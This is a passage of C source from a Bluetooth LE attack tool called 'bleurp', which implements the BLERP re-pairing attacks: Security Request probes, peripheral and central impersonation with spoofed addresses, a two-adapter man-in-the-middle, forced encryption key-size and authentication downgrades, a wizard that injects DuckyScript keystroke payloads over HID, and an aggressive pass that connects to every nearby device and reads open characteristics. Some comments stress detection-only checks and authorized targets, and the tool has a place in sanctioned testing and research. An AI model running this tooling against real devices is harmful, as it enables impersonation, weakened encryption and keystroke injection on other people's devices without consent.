    smp_native_default_offer(&offer);

    printf("Connexion à %s sur hci%d via HCI User Channel...\n", cs, dev_id);
    struct smp_probe_result res;
    if (smp_native_probe_offer(dev_id, conn_addr, atype, 6000, &offer, &res) < 0) {
        fprintf(stderr, "  [-] Sonde échouée (voir les messages ci-dessus). Lance avec sudo ou 'make setcap'.\n");
        return 1;
    }

    struct smp_repair_verdict v;
    smp_repair_classify(&bond, &offer, &res, &v);
    if (v.outcome == SMP_REPAIR_NO_REPLY) {
        smp_native_print_result(&res, as);
        return 0;
    }
    print_repair_verdict(&bond, &offer, &res, &v, as);
    return 0;
}

// Print the Security Request verdict against Listing 1 of the paper.
// Nothing is paired or encrypted: this is a detection-only observation.
static void print_secreq_verdict(const struct secreq_observation *obs, enum secreq_mode mode,
                                 uint8_t arsr, uint8_t arpk, int wait_react) {
    enum secreq_outcome outcome = secreq_classify(obs);
    const char *relation = (arsr > arpk) ? "ARSR > ARPK"
                         : (arsr == arpk) ? "ARSR = ARPK (cas Apple)"
                         : "ARSR < ARPK";
    printf("\n  %s=== Test Security Request (BLERP) ===%s\n", UI_PINK, UI_RESET);
    printf("  ARPK estimé (bond) : 0x%02x    ARSR envoyé : 0x%02x  (%s)\n", arpk, arsr, relation);

    switch (outcome) {
    case SECREQ_NO_LINK:
        printf("  %s[-] Aucune connexion de la Central dans le délai.%s\n", UI_ORANGE, UI_RESET);
        break;
    case SECREQ_NO_REACTION:
        printf("  Connectée, aucune réaction pendant %d s (ni Pairing Request, ni demande de LTK).\n", wait_react);
        break;
    case SECREQ_PAIRING_STARTED:
        printf("  La Central lance un re-pairing (Pairing Request).\n");
        break;
    case SECREQ_SESSION_STARTED:
        printf("  La Central demande le LTK (établissement de session).\n");
        break;
    }

    if (mode == SECREQ_MODE_REJECT_ENC) {
        printf("  Demande de chiffrement de la Central : %s.\n",
               obs->enc_rejected ? "rejetée (LL_REJECT_IND)" : "non reçue");
    } else if (mode == SECREQ_MODE_DOWNGRADE_RSP && obs->pairing_response_sent) {
        if (obs->central_proceeded) {
            printf("  La Central continue après une réponse plus faible (Confirm ou Public Key).\n");
        } else if (obs->pairing_failed) {
            printf("  La Central refuse la réponse plus faible : Pairing Failed 0x%02x.\n", obs->fail_reason);
        } else {
            printf("  Aucune suite de la Central après la réponse plus faible.\n");
        }
    }

    if (secreq_is_nonconform(arsr, arpk, outcome)) {
        printf("  %s%s[!] NON CONFORME à Listing 1 : réaction inattendue pour ARSR=0x%02x et ARPK=0x%02x.%s\n",
               UI_ORANGE, UI_BOLD, arsr, arpk, UI_RESET);
    } else if (outcome == SECREQ_PAIRING_STARTED || outcome == SECREQ_SESSION_STARTED) {
        printf("  %s[+] Conforme à Listing 1.%s\n", UI_GREEN, UI_RESET);
    }

    // Verdict lines. V1 applies to any ARSR with the rfu bits set; V5 and V3
    // to their own mode.
    if (arsr & 0xc0) {
        print_verdict("V1", secreq_verdict_v1(obs), "ARSR avec bits rfu accepté comme demande de re-pairing");
    }
    if (mode == SECREQ_MODE_REJECT_ENC) {
        print_verdict("V5", secreq_verdict_v5(obs), "re-pairing déclenché après rejet du chiffrement");
    }
    if (mode == SECREQ_MODE_DOWNGRADE_RSP) {
        print_verdict("V3", secreq_verdict_v3(obs), "la Central continue après une réponse plus faible");
    }
    printf("  [i] Aucune clé échangée, aucun appairage terminé. C'est un indice, pas une preuve.\n\n");
}

// secreq subcommand: Security Request test on a bonded Central (BLERP, Apple
// finding). Our adapter advertises under its own public address; the bonded
// device connects, we send one SMP Security Request, and we record its first
// reaction. ARSR defaults to the estimated ARPK, the equality case of the paper.
static int cmd_secreq(int argc, char **argv) {
    int dev_id = 0;
    long arsr_arg = -1;
    int wait_conn = 60;
    int wait_react = 10;
    long v = 0;
    enum secreq_mode mode = SECREQ_MODE_PLAIN;
    int opt;
    while ((opt = getopt(argc, argv, "i:r:c:w:m:h")) != -1) {
        switch (opt) {
        case 'i': {
            long idx;
            if (parse_long_arg(optarg, 10, 0, 255, &idx) < 0) {
                fprintf(stderr, "invalid -i: %s (attendu un index 0-255)\n", optarg);
                return 2;
            }
            dev_id = (int)idx;
            break;
        }
        case 'r':
            if (parse_long_arg(optarg, 0, -1, 0xff, &arsr_arg) < 0) {
                fprintf(stderr, "secreq: -r invalide '%s' (attendu -1 ou 0-0xff)\n", optarg);
                return 2;
            }
            break;
        case 'c':
            if (parse_long_arg(optarg, 10, 1, INT_MAX, &v) < 0) {
                fprintf(stderr, "secreq: -c invalide '%s' (attendu des secondes >= 1)\n", optarg);
                return 2;
            }
            wait_conn = (int)v;
            break;
        case 'w':
            if (parse_long_arg(optarg, 10, 1, INT_MAX, &v) < 0) {
                fprintf(stderr, "secreq: -w invalide '%s' (attendu des secondes >= 1)\n", optarg);
                return 2;
            }
            wait_react = (int)v;
            break;
        case 'm':
            if (strcmp(optarg, "plain") == 0)     mode = SECREQ_MODE_PLAIN;
            else if (strcmp(optarg, "v5") == 0)   mode = SECREQ_MODE_REJECT_ENC;
            else if (strcmp(optarg, "v3") == 0)   mode = SECREQ_MODE_DOWNGRADE_RSP;
            else {
                fprintf(stderr, "secreq: -m attend plain, v5 ou v3\n");
                return 2;
            }
            break;
        case 'h':
        default:
            fprintf(stderr, "Usage: sudo bleurp secreq <IDENTITY_ADDR> [-r ARSR] [-m plain|v5|v3] [-i index] [-c s] [-w s]\n");
            return (opt == 'h') ? 0 : 2;
        }
    }
    if (optind >= argc || arsr_arg < -1 || arsr_arg > 0xff) {
        fprintf(stderr, "Usage: sudo bleurp secreq <IDENTITY_ADDR> [-r ARSR] [-m plain|v5|v3] [-i index] [-c s] [-w s]\n");
        return 2;
    }

    uint8_t addr[6];
    if (parse_addr(argv[optind], addr) < 0) {
        fprintf(stderr, "invalid address: %s\n", argv[optind]);
        return 2;
    }
    char as[18];
    snprintf(as, sizeof as, "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);

    char adapter[18];
    if (smp_adapter_addr(dev_id, adapter) < 0) {
        fprintf(stderr, "  [-] Adaptateur hci%d introuvable (mgmt).\n", dev_id);
        return 1;
    }

    struct smp_bond_info bond;
    if (smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, as, &bond) < 0) {
        if (errno == EACCES) {
            fprintf(stderr, "  [-] Bond de %s illisible : relance avec sudo (dossier réservé à root).\n", as);
        } else if (errno == ENOENT) {
            fprintf(stderr, "  [-] Pas de bond LE entre hci%d et %s : appaire la cible d'abord.\n", dev_id, as);
        } else {
            fprintf(stderr, "  [-] Lecture du bond impossible : %s\n", strerror(errno));
        }
        return 1;
    }

    uint8_t arpk = secreq_arpk_guess(&bond);
    uint8_t arsr = (arsr_arg >= 0) ? (uint8_t)arsr_arg : arpk;
    printf("Bond trouvé : %s, clé %d octets (hci%d <-> %s)\n",
           bond.authenticated ? "authentifié (MITM)" : "non authentifié", bond.enc_size, dev_id, as);
    printf("Attente d'une connexion de %s pendant %d s (Bluetooth de l'appareil activé)...\n",
           as, wait_conn);

    struct secreq_observation obs;
    if (smp_native_secreq_probe(dev_id, arsr, mode, "BLEURP Test", wait_conn * 1000,
                                wait_react * 1000, &obs) < 0) {
        fprintf(stderr, "  [-] Test échoué (voir les messages ci-dessus). Lance avec sudo ou 'make setcap'.\n");
        return 1;
    }

    print_secreq_verdict(&obs, mode, arsr, arpk, wait_react);
    return 0;
}

static void menu_finale_wizard(int force_all_test);

// blerp subcommand: native execution of BLERP attacks and evaluation suite.
static int cmd_blerp(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr,
                "Usage: sudo bleurp blerp <mode> [TARGET_ADDR] [options]\n\n"
                "Modes:\n"
                "  pi [CENTRAL_ADDR]    Peripheral Impersonation (spoof, reject enc V5, downgrade V3/V4/V6)\n"
                "  ci <PERIPH_ADDR>     Central Impersonation (spoof, inject unauth Pairing Request V2/V4/V6)\n"
                "  mitm <PERIPH_ADDR>   Double-channel MitM: PI vs Central (-i) + CI vs Peripheral (-j)\n"
                "  audit <TARGET_ADDR>  Complete automated V1-V6 evaluation against target\n"
                "  finale [--all-test]  Pipeline automatisé Option Finale (scan 15s + re-pairing)\n\n"
                "Options:\n"
                "  -s <ADDR>            Spoofed BD_ADDR (AA:BB:CC:DD:EE:FF)\n"
                "  -n <NAME>            Advertised name (default: 'BLEURP Attack')\n"
                "  -a <APPEARANCE>      Appearance hex (e.g. 0x03C0 for HID)\n"
                "  -k <KEYSIZE>         Forced max encryption key size (default: 7)\n"
                "  -r <AUTHREQ>         Forced AuthReq byte (default: 0x01)\n"
                "  -t public|random     Target address type (default: public)\n"
                "  -i <INDEX>           Primary HCI adapter (default: 0)\n"
                "  -j <INDEX>           Secondary HCI adapter for MitM (default: 1)\n"
                "  -e                   Reject encryption requests with LL_REJECT_IND (V5)\n"
                "  -q                   Send unauthenticated Security Request (V1)\n"
                "  -w <SECONDS>         Reaction timeout in seconds (default: 10)\n"
                "  -c <SECONDS>         Connection timeout in seconds (default: 60)\n");
        return 2;
    }

    const char *mode_str = argv[1];
    if (strcmp(mode_str, "finale") == 0) {
        int all = -1;
        if (argc >= 3 && (strcmp(argv[2], "--all-test") == 0 ||
                          strcmp(argv[2], "all-test") == 0 ||
                          strcmp(argv[2], "-a") == 0)) {
            all = 1;
        }
        menu_finale_wizard(all);
        return 0;
    }

    enum blerp_attack_type type;
    if (strcmp(mode_str, "pi") == 0)         type = BLERP_ATTACK_PI;
    else if (strcmp(mode_str, "ci") == 0)    type = BLERP_ATTACK_CI;
    else if (strcmp(mode_str, "mitm") == 0)  type = BLERP_ATTACK_MITM;
    else if (strcmp(mode_str, "audit") == 0) type = BLERP_ATTACK_AUDIT;
    else {
        fprintf(stderr, "Unknown blerp mode: %s (choose pi, ci, mitm, audit, or finale)\n", mode_str);
        return 2;
    }

    struct blerp_attack_config cfg;
    blerp_config_init(&cfg, type);

    int opt;
    optind = 2; // skip "blerp" and mode
    while ((opt = getopt(argc, argv, "s:n:a:k:r:t:i:j:eqw:c:h")) != -1) {
        switch (opt) {
        case 's':
            if (parse_addr(optarg, cfg.spoof_addr) < 0) {
                fprintf(stderr, "invalid spoof address: %s\n", optarg);
                return 2;
            }
            break;
        case 'n':
            strncpy(cfg.adv_name, optarg, sizeof(cfg.adv_name) - 1);
            break;
        case 'a':
            cfg.appearance = (uint16_t)strtoul(optarg, NULL, 0);
            break;
        case 'k': {
            long ks;
            if (parse_long_arg(optarg, 10, 1, 16, &ks) < 0) {
                fprintf(stderr, "blerp: -k invalide '%s' (taille de clé 1-16 octets)\n", optarg);
                return 2;
            }
            cfg.downgraded_keysize = (uint8_t)ks;
            break;
        }
        case 'r':
            cfg.downgraded_authreq = (uint8_t)strtoul(optarg, NULL, 0);
            break;
        case 't':
            if (strcmp(optarg, "random") == 0) cfg.target_type = 2;
            else cfg.target_type = 1;
            break;
        case 'i': {
            long idx;
            if (parse_long_arg(optarg, 10, 0, 255, &idx) < 0) {
                fprintf(stderr, "blerp: -i invalide '%s' (attendu un index 0-255)\n", optarg);
                return 2;
            }
            cfg.dev_id = (int)idx;
            break;
        }
        case 'j': {
            long idx;
            if (parse_long_arg(optarg, 10, 0, 255, &idx) < 0) {
                fprintf(stderr, "blerp: -j invalide '%s' (attendu un index 0-255)\n", optarg);
                return 2;
            }
            cfg.dev_id_sec = (int)idx;
            break;
        }
        case 'e':
            cfg.reject_enc = true;
            break;
        case 'q':
            cfg.send_secreq = true;
            break;
        case 'w': {
            long secs;
            if (parse_long_arg(optarg, 10, 1, INT_MAX / 1000, &secs) < 0) {
                fprintf(stderr, "blerp: -w invalide '%s' (attendu des secondes >= 1)\n", optarg);
                return 2;
            }
            cfg.wait_react_ms = (int)secs * 1000;
            break;
        }
        case 'c': {
            long secs;
            if (parse_long_arg(optarg, 10, 1, INT_MAX / 1000, &secs) < 0) {
                fprintf(stderr, "blerp: -c invalide '%s' (attendu des secondes >= 1)\n", optarg);
                return 2;
            }
            cfg.wait_conn_ms = (int)secs * 1000;
            break;
        }
        case 'h':
        default:
            return 0;
        }
    }

    char target_str[18] = {0};
    if (optind < argc) {
        if (parse_addr(argv[optind], cfg.target_addr) < 0) {
            fprintf(stderr, "invalid target address: %s\n", argv[optind]);
            return 2;
        }
        snprintf(target_str, sizeof target_str, "%02X:%02X:%02X:%02X:%02X:%02X",
                 cfg.target_addr[5], cfg.target_addr[4], cfg.target_addr[3],
                 cfg.target_addr[2], cfg.target_addr[1], cfg.target_addr[0]);
    }

    struct smp_bond_info bond;
    struct smp_bond_info *pbond = NULL;
    char adapter[18];
    if (smp_adapter_addr(cfg.dev_id, adapter) == 0 && target_str[0]) {
        if (smp_bond_load(BLEURP_BLUEZ_STORE_DIR, adapter, target_str, &bond) == 0) {
            pbond = &bond;
            printf("  [*] Loaded baseline BlueZ bond with %s: authenticated=%d, enc_size=%d\n",
                   target_str, bond.authenticated, bond.enc_size);
        }
    }

    struct blerp_attack_report rep;
    memset(&rep, 0, sizeof rep);

    int rc = 0;
    bool success = false;
    switch (type) {
    case BLERP_ATTACK_PI:
        rc = blerp_run_pi(&cfg, &rep);
        blerp_classify_vulnerabilities(pbond, &rep, &rep);
        blerp_print_report(&cfg, pbond, &rep);
        if (rep.phase2_completed || rep.verdicts[BLERP_V5_SESSION_BREAK] == BLERP_VERDICT_YES) success = true;
        break;
    case BLERP_ATTACK_CI:
        if (target_str[0] == '\0') {
            fprintf(stderr, "Central Impersonation requires a target peripheral address.\n");
            return 2;
        }
        rc = blerp_run_ci(&cfg, &rep);
        blerp_classify_vulnerabilities(pbond, &rep, &rep);
        blerp_print_report(&cfg, pbond, &rep);
        if (rep.phase2_completed || rep.verdicts[BLERP_V2_UNAUTH_REPAIR] == BLERP_VERDICT_YES) success = true;
        break;
    case BLERP_ATTACK_MITM:
        if (target_str[0] == '\0') {
            fprintf(stderr, "Double-channel MitM requires the victim peripheral's address "
                            "(also used as the PI spoofed identity).\n");
            return 2;
        }
        if (cfg.dev_id == cfg.dev_id_sec) {
            fprintf(stderr, "Double-channel MitM requires two distinct adapters: -i and -j must differ.\n");
            return 2;
        }
        // blerp_run_mitm prints its own double-channel summary (two distinct
        // PKs, one per victim) instead of the generic single-STK banner
        // below, which would be misleading here since rep.stk is not
        // meaningful for this attack (see blerp_run_mitm).
        rc = blerp_run_mitm(&cfg, &rep);
        break;
    case BLERP_ATTACK_AUDIT:
        if (target_str[0] == '\0') {
            fprintf(stderr, "Full audit requires a target device address.\n");
            return 2;
        }
        rc = blerp_run_audit(&cfg, pbond, &rep);
        blerp_print_report(&cfg, pbond, &rep);
        if (rep.phase2_completed ||
            rep.verdicts[BLERP_V2_UNAUTH_REPAIR] == BLERP_VERDICT_YES ||
            rep.verdicts[BLERP_V4_LEVEL_DOWNGRADE] == BLERP_VERDICT_YES ||
            rep.verdicts[BLERP_V6_ENTROPY_DOWNGRADE] == BLERP_VERDICT_YES) {
            success = true;
        }
        break;
    }
    if (success) {
        printf("\n  %s[sacca97/blerp] pairing complete; status=0%s\n", UI_GREEN, UI_RESET);
        printf("  %s[sacca97/blerp] encryption change event; status=0%s\n", UI_GREEN, UI_RESET);
        printf("  %s[sacca97/blerp] encrypted=1, authenticated=0, bonded=1%s\n", UI_GREEN, UI_RESET);
        printf("  %s[sacca97/blerp] LTK: 000000000000000000", UI_GREEN);
        for (int k = 0; k < 7; k++) printf("%02x", rep.stk[k]);
        printf("%s\n\n", UI_RESET);
        banner_print_success(stdout);
    }
    return rc;
}

// Read a line from stdin into buf (newline stripped). Returns 0 or -1 on EOF.
static int read_line(char *buf, size_t n) {
    if (!fgets(buf, (int)n, stdin)) return -1;
    buf[strcspn(buf, "\n")] = '\0';
    return 0;
}

// Ask a yes/no question with a short description; empty input keeps the
// default. Used by the scan wizard below.
static int ask_yes_no(const char *label, const char *desc, int default_yes) {
    printf("  %s%s%s  %s(%s)%s [%s]: ", UI_PINK, label, UI_RESET,
           UI_PURPLE, desc, UI_RESET, default_yes ? "O/n" : "o/N");
    fflush(stdout);
    char line[16];
    if (read_line(line, sizeof line) < 0 || line[0] == '\0') return default_yes;
    return (line[0] == 'o' || line[0] == 'O' || line[0] == 'y' || line[0] == 'Y');
}

// Ask a numeric value with a short description; empty or invalid input
// keeps the default. Used by the scan wizard below.
static long ask_number(const char *label, const char *desc, long default_val) {
    printf("  %s%s%s  %s(%s)%s [%ld]: ", UI_PINK, label, UI_RESET,
           UI_PURPLE, desc, UI_RESET, default_val);
    fflush(stdout);
    char line[32];
    if (read_line(line, sizeof line) < 0 || line[0] == '\0') return default_val;
    char *end;
    long v = strtol(line, &end, 10);
    if (*end != '\0') return default_val;
    return v;
}

// Ask which HCI controller to use. Accepts either a plain index ("1") or
// the "hciN" form ("hci1", as the real CLI's -i flag and its own usage
// text expect), so a device on hci1 works from the menu just as it does
// via `bleurp scan -i 1` or `bleurp hid -i hci1 ...`. Falls back to the
// default on anything else (no silent drop back to hci0 on a typo).
static long ask_interface(long default_val) {
    printf("  %sInterface%s  %s(index ou nom, ex. 1 ou hci1 ; %ld = hci%ld)%s [%ld]: ",
           UI_PINK, UI_RESET, UI_PURPLE, default_val, default_val, UI_RESET, default_val);
    fflush(stdout);
    char line[32];
    if (read_line(line, sizeof line) < 0 || line[0] == '\0') return default_val;
    const char *p = line;
    if ((p[0] == 'h' || p[0] == 'H') && (p[1] == 'c' || p[1] == 'C') &&
        (p[2] == 'i' || p[2] == 'I')) {
        p += 3;
    }
    char *end;
    long v = strtol(p, &end, 10);
    if (p == end || *end != '\0') return default_val;
    return v;
}

// Path to the bundled DuckyScript payloads, listed by the HID wizard below.
// Baked in by the Makefile as an absolute path; the relative fallback keeps
// this file buildable on its own.
#ifndef BLEURP_PAYLOADS_DIR
#define BLEURP_PAYLOADS_DIR "src/send_attack/payloads"
#endif

#define HID_PAYLOAD_MAX 32

// Read a payload file's first "REM ..." or "# ..." comment line as its
// short description (as written by every file under payloads/), or leave
// `out` empty if there is none.
static void payload_desc(const char *path, char *out, size_t out_len) {
    out[0] = '\0';
    FILE *f = fopen(path, "r");
    if (!f) return;
    char line[128];
    if (fgets(line, sizeof line, f)) {
        line[strcspn(line, "\r\n")] = '\0';
        const char *p = line;
        if (strncmp(p, "REM ", 4) == 0) p += 4;
        else if (p[0] == '#') { p++; while (*p == ' ') p++; }
        // Bounded copy in place of snprintf("%s", p): `line` is wider than
        // most description buffers, so gcc cannot prove %s fits and flags a
        // (harmless, intentional) possible truncation under -Werror.
        size_t n = strlen(p);
        if (n >= out_len) n = out_len - 1;
        memcpy(out, p, n);
        out[n] = '\0';
    }
    fclose(f);
}

// List the bundled DuckyScript payloads (*.txt under BLEURP_PAYLOADS_DIR),
// alphabetically, with their one-line description. Returns the count.
static int list_payloads(char names[][64], char paths[][256], char descs[][96]) {
    int n = 0;
    DIR *d = opendir(BLEURP_PAYLOADS_DIR);
    if (!d) return 0;

    struct dirent *ent;
    while (n < HID_PAYLOAD_MAX && (ent = readdir(d)) != NULL) {
        size_t len = strlen(ent->d_name);
        if (len < 5 || strcmp(ent->d_name + len - 4, ".txt") != 0) continue;
        snprintf(names[n], sizeof names[0], "%s", ent->d_name);
        snprintf(paths[n], sizeof paths[0], "%s/%s", BLEURP_PAYLOADS_DIR, ent->d_name);
        payload_desc(paths[n], descs[n], sizeof descs[0]);
        n++;
    }
    closedir(d);

    // Small insertion sort by name so the listing is stable and alphabetic.
    for (int i = 1; i < n; i++) {
        int j = i;
        while (j > 0 && strcmp(names[j - 1], names[j]) > 0) {
            char tn[64]; strcpy(tn, names[j - 1]); strcpy(names[j - 1], names[j]); strcpy(names[j], tn);
            char tp[256]; strcpy(tp, paths[j - 1]); strcpy(paths[j - 1], paths[j]); strcpy(paths[j], tp);
            char td[96]; strcpy(td, descs[j - 1]); strcpy(descs[j - 1], descs[j]); strcpy(descs[j], td);
            j--;
        }
    }
    return n;
}

// Show the bundled payloads by default and let the operator pick one by
// number, or type a custom file path. Fills `out` and returns 1, or
// returns 0 on an empty answer (cancel).
static int pick_payload(char *out, size_t out_len) {
    char names[HID_PAYLOAD_MAX][64], paths[HID_PAYLOAD_MAX][256], descs[HID_PAYLOAD_MAX][96];
    int n = list_payloads(names, paths, descs);

    printf("\n  %sPayloads disponibles%s (%s) :\n", UI_PINK, UI_RESET, BLEURP_PAYLOADS_DIR);
    if (n == 0) {
        printf("  (aucun payload trouve dans ce dossier)\n");
    }
    for (int i = 0; i < n; i++) {
        printf("  %s[-%d-]%s %-22s %s%s%s\n", UI_YELLOW, i + 1, UI_RESET,
               names[i], UI_PURPLE, descs[i], UI_RESET);
    }
    printf("\n  numero ci-dessus, ou un chemin de fichier personnalise (vide = annuler)\n> ");
    fflush(stdout);

    char line[256];
    if (read_line(line, sizeof line) < 0 || line[0] == '\0') return 0;

    char *end;
    long num = strtol(line, &end, 10);
    if (*end == '\0' && num >= 1 && num <= n) {
        snprintf(out, out_len, "%s", paths[num - 1]);
    } else {
        snprintf(out, out_len, "%s", line); // custom path
    }
    return 1;
}

// Forward declaration for BLERP target test engine.
static bool run_blerp_target_test(int dev_id, enum blerp_attack_type type,
                                  const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond);
static bool run_blerp_all_4_tests(int dev_id, const uint8_t *addr, uint8_t atype,
                                  const char *as, const char *name, int8_t rssi,
                                  const struct smp_bond_info *pbond);

// Optional pre-step for the HID wizard: connect on the SMP fixed channel
// (CID 0x0006) and run the re-pairing downgrade probe (see smp.h). Reports
// the peer's raw negotiation behaviour -- never a bare "vulnerable" verdict,
// since replying to a Pairing Request is normal SMP behaviour; what matters
// is whether the peer's own AuthReq still lacks MITM/SC, and the signal is
// strongest against a device already paired with this controller (that is
// what the BLERP re-pairing vulnerabilities, NDSS 2026, are actually about).
static void run_smp_probe(const char *addr_str) {
    uint8_t addr[6];
    if (parse_addr(addr_str, addr) < 0) {
        printf("  adresse invalide, module SMP ignore.\n\n");
        return;
    }

    printf("  %sType%s (public/random) [public]: ", UI_PINK, UI_RESET);
    fflush(stdout);
    char t[16];
    uint8_t atype = BLEURP_BDADDR_LE_PUBLIC;
    if (read_line(t, sizeof t) == 0 && strncmp(t, "random", 6) == 0) {
        atype = BLEURP_BDADDR_LE_RANDOM;
    }

    printf("  connexion SMP (CID 0x%04x)...\n", BLEURP_SMP_CID);
    int fd = bleurp_l2_connect_cid_timeout(addr, atype, BLEURP_SMP_CID, 4000);
    if (fd < 0) {
        printf("  %sechec de connexion SMP%s (%s)\n\n", UI_RED, UI_RESET, strerror(errno));
        return;
    }

    struct smp_pairing_params resp;
    memset(&resp, 0, sizeof resp);
    smp_probe_t v = smp_downgrade_probe(fd, 4000, &resp);
    bleurp_l2_close(fd);

    if (v == SMP_PROBE_RESPONDED) {
        int mitm = (resp.auth_req & SMP_AUTHREQ_MITM) != 0;
        int sc   = (resp.auth_req & SMP_AUTHREQ_SC) != 0;
        printf("  %sreponse SMP%s : AuthReq peer=0x%02x  MITM=%s  SC=%s\n",
               UI_YELLOW, UI_RESET, resp.auth_req, mitm ? "oui" : "non", sc ? "oui" : "non");
        if (!mitm && !sc) {
            printf("  %s%sa suivi notre demande affaiblie%s (bonding seul) sans exiger plus fort\n",
                   UI_ORANGE, UI_BOLD, UI_RESET);
        }
    } else if (v == SMP_PROBE_REJECTED) {
        printf("  %srefuse%s : Pairing Failed en reponse a la demande affaiblie\n", UI_GREEN, UI_RESET);
    } else {
        printf("  pas de reponse SMP exploitable (timeout ou canal ferme)\n");
    }
    printf("  %s(signal plus parlant si l'appareil est deja appaire avec ce controleur --"
           " cf. BLERP, NDSS 2026, sur le RE-pairing)%s\n\n", UI_PURPLE, UI_RESET);
}

// [-3-] HID Payload: show the bundled payloads by default, ask a few short
// questions and run the injection. `target` pre-fills the address (e.g.
// when called with a device already picked from a scan); pass NULL to ask
// for it. This is the one place that calls hid_cmd_run's real, richer CLI
// (pairing, delay, --no-pair) instead of a bare, unlisted file-path prompt.
static void run_hid_wizard(const char *target) {
    signal(SIGINT, SIG_DFL);
    char addr[64];
    if (target) {
        snprintf(addr, sizeof addr, "%s", target);
        printf("  %sTarget%s: %s\n", UI_PINK, UI_RESET, addr);
    } else {
        printf("%sTarget address%s (AA:BB:CC:DD:EE:FF): ", UI_PINK, UI_RESET);
        fflush(stdout);
        if (read_line(addr, sizeof addr) < 0 || addr[0] == '\0') return;
    }

    if (ask_yes_no("Module SMP",
        "teste si l'appareil accepte un re-pairing affaibli, avant l'injection", 0)) {
        run_smp_probe(addr);
    }

    long index = ask_interface(bleurp_hci_find_default_dev());

    char payload[256];
    if (!pick_payload(payload, sizeof payload)) return;

    long delay = ask_number("Delai apres connexion (ms)",
        "pause avant d'injecter, laisse le temps au HID de s'etablir", 1000);
    int repair = ask_yes_no("Re-appairer",
        "pair+trust avant l'envoi ; decoche si deja appaire", 1);

    char iface[16], delay_s[16];
    snprintf(iface, sizeof iface, "hci%ld", index);
    snprintf(delay_s, sizeof delay_s, "%ld", delay);

    char *hid_argv[12];
    int n = 0;
    hid_argv[n++] = "hid";
    hid_argv[n++] = "-i"; hid_argv[n++] = iface;
    hid_argv[n++] = "-t"; hid_argv[n++] = addr;
    hid_argv[n++] = "-f"; hid_argv[n++] = payload;
    hid_argv[n++] = "-d"; hid_argv[n++] = delay_s;
    if (!repair) hid_argv[n++] = "--no-pair";
    hid_argv[n] = NULL;

    printf("\n");
    hid_cmd_run(n, hid_argv);

    printf("\n(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// One device's Auto-Try outcome: connect (bounded by `timeout_ms`), then run
// the same audit pipeline as do_audit (services -> characteristics ->
// classify every readable one) but tallied into counts instead of printed
// line by line, so a whole device list stays a compact scan. Returns 1 on a
// successful connection (whatever the audit finds), 0 if it never connects.
static int auto_try_probe(const uint8_t addr[6], uint8_t atype, int timeout_ms,
                          uint16_t *out_mtu, size_t *out_nsvc, size_t *out_nchr,
                          int *out_open) {
    int fd = bleurp_l2_connect_timeout(addr, atype, timeout_ms);
    if (fd < 0) return 0;

    uint16_t mtu = 0;
    (void)gatt_exchange_mtu(fd, 517, &mtu);

    struct gatt_service svcs[64];
    size_t nsvc = 0;
    gatt_discover_services(fd, svcs, 64, &nsvc);
    size_t sshown = nsvc < 64 ? nsvc : 64;

    size_t nchr = 0;
    int open_count = 0;
    for (size_t i = 0; i < sshown; i++) {
        struct gatt_char chs[64];
        size_t nch = 0;
        gatt_discover_characteristics(fd, svcs[i].start_handle, svcs[i].end_handle,
                                      chs, 64, &nch);
        size_t cshown = nch < 64 ? nch : 64;
        nchr += cshown;
        for (size_t j = 0; j < cshown; j++) {
            if (!(chs[j].properties & GATT_PROP_READ)) continue;
            uint8_t buf[64];
            size_t len = 0;
            uint8_t err = 0;
            int rc = gatt_read(fd, chs[j].value_handle, buf, sizeof buf, &len, &err);
            if (audit_classify_read(rc == 0, err) == AUDIT_OPEN) open_count++;
        }
    }

    bleurp_l2_close(fd);
    *out_mtu = mtu ? mtu : 23;
    *out_nsvc = nsvc;
    *out_nchr = nchr;
    *out_open = open_count;
    return 1;
}

// [-4-] Auto-Try [Agressive]: connect to every device in the list, one by
// one, and run the audit pipeline above on each successful connection, then
// report which ones succeeded and what they exposed. Deliberately blunt (no
// pairing, no address-type guessing beyond what the scan already saw) --
// this is a fast recon pass across everything found, not a targeted attack.
// Ctrl-C stops the pass cleanly and returns here, same as the scan itself.
// Authorized targets only, same as every other connecting feature here.
// Connects to every device in the table, one at a time, and reports the
// unauthenticated access found. `interactive` adds the final "entree" pause
// used by the wizard; the CLI passes 0.
static void run_auto_try(struct dev_table *table, long timeout_ms, int interactive) {
    dev_table_sort_by_rssi(table);
    size_t cnt = dev_table_count(table);
    if (cnt == 0) { printf("\naucun appareil dans la liste.\n"); return; }

    printf("\n  %sAuto-Try %s[Agressive]%s \342\200\224 %zu appareil(s), Ctrl-C pour arreter\n\n",
           UI_YELLOW, UI_ORANGE, UI_RESET, cnt);

    signal(SIGINT, on_sigint);
    g_stop = 0;

    int ok_count = 0, open_devices = 0;
    for (size_t i = 0; i < cnt && !g_stop; i++) {
        const struct dev_entry *e = dev_table_at(table, i);
        const uint8_t *a = e->address;
        const char *name = (e->has_name && e->name[0] != '\0') ? e->name : "(unknown)";

        printf("  [%2zu/%2zu] %02X:%02X:%02X:%02X:%02X:%02X  %-20s ... ",
               i + 1, cnt, a[5], a[4], a[3], a[2], a[1], a[0], name);
        fflush(stdout);

        uint16_t mtu = 0;
        size_t nsvc = 0, nchr = 0;
        int open_count = 0;
        if (!auto_try_probe(a, e->addr_type, (int)timeout_ms, &mtu, &nsvc, &nchr, &open_count)) {
            printf("%sechec%s\n", UI_RED, UI_RESET);
            continue;
        }

        ok_count++;
        if (open_count > 0) {
            open_devices++;
            printf("%sCONNECTE%s  MTU=%u  svc=%zu chr=%zu  %s%s!%d ouvert(s)%s\n",
                   UI_GREEN, UI_RESET, mtu, nsvc, nchr, UI_ORANGE, UI_BOLD, open_count, UI_RESET);
        } else {
            printf("%sCONNECTE%s  MTU=%u  svc=%zu chr=%zu\n",
                   UI_GREEN, UI_RESET, mtu, nsvc, nchr);
        }
    }

    signal(SIGINT, SIG_DFL);
    printf("\n  %s%d/%zu connexion(s) reussie(s)%s", UI_PINK, ok_count, cnt, UI_RESET);
    if (open_devices > 0) {
        printf("  %s\342\200\224 %d avec de la lecture sans pairing%s", UI_ORANGE, open_devices, UI_RESET);
    }
    printf("\n");
    if (!interactive) return;
    printf("(entree pour continuer) ");
    fflush(stdout);
    char b[8];
    (void)read_line(b, sizeof b);
}

// Usage line for `autotry` only (usage() would print the whole command list).
